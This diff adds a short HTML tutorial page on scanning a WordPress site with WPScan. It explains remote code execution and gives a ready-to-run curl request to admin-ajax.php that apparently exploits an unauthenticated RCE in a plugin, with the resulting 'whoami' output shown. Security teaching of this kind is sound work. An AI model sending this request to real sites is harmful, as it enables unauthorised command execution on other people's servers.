@@ -1,0 +1,25 @@
+ <meta name=”robots” content=”noindex,nofollow”/>
+  <a href=../index.html>Back to home</a>
+<hr/>
+<h1>Using WPScan to find vulnerabilities</h1>
+
+<p></p>
+
+<h2>Start WPScan</h2>
+<p><ol>
+<ul>sudo wpscan --url http://[website] --api-token [API token]</ul>
+</ol></p>
+<p>After analysis, wpscan will show the vulnerabilities found</p>
+<h2>Remote Code Execution (RCE) Attack</h2>
+<p>Remote Code Execution vulnerability is a critical security flaw that allows an attacker to execute arbitrary code on a target system remotely, without needing physical access to the system. 
+  This type of vulnerability is particularly dangerous because it enables attackers to take control of the target system, potentially gaining unauthorized access, stealing data, or causing damage to the 
+  system or network. Attackers exploit these vulnerabilities by injecting malicious code into the target system through various means such as input fields, file uploads, or network protocols. Once the 
+  malicious code is executed, the attacker can gain control over the system and perform actions as if they were an authenticated user or system administrator.</p>
+<p><ol>
+  <ul>after analysis with wpscan, browse to the <b>Plugin(s) Identified</b> section, and observe the installed vulnerable plugins</ul>
+  <ul>one of the plugins may have an <b>Unauthenticated Remote Code Execution (RCE)</b> vulnerability</ul>
+  <ul>To perform RCE attack, run <i>curl -i 'http://[website]/wp-admin/admin-ajax.php?action=upg_datatable&field:exec:whoami:NULL:NULL'</i></ul>
+  <ul>This curl command exploits a WordPress plugin vulnerability by sending a malicious request to the <b>admin-ajax.php</b> file, 
+  allowing an attacker to execute arbitrary system commands via the <b>exec</b> function, potentially leading to <b>remote code execution</b></ul>
+  <ul>In this case, <b>whoami</b> was executed, yielding the outcome <b>nt authority\\system</b></ul>
+</ol></p>
